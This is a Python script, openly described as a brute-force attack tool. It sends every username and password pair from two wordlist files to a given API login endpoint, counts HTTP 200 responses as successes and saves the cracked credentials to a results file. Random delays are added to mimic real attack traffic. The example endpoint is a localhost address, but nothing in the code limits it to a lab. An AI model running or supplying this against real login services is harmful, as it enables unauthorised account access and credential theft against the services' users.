import requests
import time
import random
import argparse
from datetime import datetime

def load_dictionary(file_path):
    """Load a dictionary file and return a list of words."""
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file.readlines() if line.strip()]
    except FileNotFoundError:
        print(f"Error: {file_path} not found.")
        return []

def log_attempt(username, password, status, response_code, response_time):
    """Log the details of each brute-force attempt to a file."""
    # Check if this is the first log entry for a session
    try:
        with open("brute_force_results.txt", "a") as file:
            if file.tell() == 0:  # If file is empty, add the session header
                file.write(f"\n[SESSION START] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

            if status == "Success":
                file.write(f"\n[SUCCESS] Username: {username} | Password: {password} | Status: {status} | Response Code: {response_code} | Response Time: {response_time:.2f} seconds\n")
            else:
                # Add a simple separator for clarity between success and failure logs
                file.write(f"\n{'-'*50}\n[FAILED] Username: {username} | Password: {password} | Status: {status} | Response Code: {response_code} | Response Time: {response_time:.2f} seconds\n")

            file.flush()  # Ensure the log is written to disk immediately
    except Exception as e:
        print(f"Error while logging attempt: {e}")

def brute_force_attack(api_url, username_file, password_file):
    """Perform the brute-force attack on the API's login endpoint."""
    print("Starting brute-force attack on /login endpoint...")

    # Load dictionaries from external files
    username_list = load_dictionary(username_file)
    password_list = load_dictionary(password_file)

    # Check if the dictionaries are loaded properly
    if not username_list or not password_list:
        print("Error: One or both dictionary files are empty or missing.")
        return

    # Track the start time for attack duration calculation
    start_time = time.time()

    # Container for successful attempts to be written first
    successful_attempts = []

    for username in username_list:
        for password in password_list:
            # Create payload
            payload = {"username": username, "password": password}

            # Send POST request to the login endpoint
            response = None
            try:
                response = requests.post(api_url, json=payload)
                response_time = response.elapsed.total_seconds()
                status = "Success" if response.status_code == 200 else "Failed"
                response_code = response.status_code
            except Exception as e:
                print(f"Error during request: {e}")
                continue

            # If the attempt was successful, store it in the list for later logging
            if status == "Success":
                successful_attempts.append((username, password, status, response_code, response_time))
            else:
                # Log the failed attempt immediately
                log_attempt(username, password, status, response_code, response_time)

            # Print results to console for immediate feedback
            print(f"Testing username: {username} | password: {password} | Status: {status} | Response Code: {response_code} | Response Time: {response_time:.2f} seconds")

            # Introduce a random delay to mimic real attack behavior and avoid overwhelming the server
            time.sleep(random.uniform(0.5, 2.0))

    # Write successful attempts to the log at the top
    with open("brute_force_results.txt", "a") as file:
        if successful_attempts:
            file.write("\n[SUCCESSFUL ATTEMPTS]\n")
            for username, password, status, response_code, response_time in successful_attempts:
                file.write(f"Username: {username} | Password: {password} | Status: {status} | Response Code: {response_code} | Response Time: {response_time:.2f} seconds\n")

    # Calculate total time taken for the attack
    total_time = time.time() - start_time
    print(f"Brute-force attack complete. Duration: {total_time:.2f} seconds.")
    print("Results saved to brute_force_results.txt.")

if __name__ == '__main__':
    # Set up command-line argument parsing
    parser = argparse.ArgumentParser(description="Brute-force attack script for API login endpoint.")
    parser.add_argument('-u', '--username', required=True, help="Path to the username dictionary file.")
    parser.add_argument('-p', '--password', required=True, help="Path to the password dictionary file.")
    parser.add_argument('-a', '--api', required=True, help="Address of the API login endpoint (e.g., http://127.0.0.1:5000/login).")

    args = parser.parse_args()

    # Run the brute-force attack with user-specified arguments
    brute_force_attack(args.api, args.username, args.password)
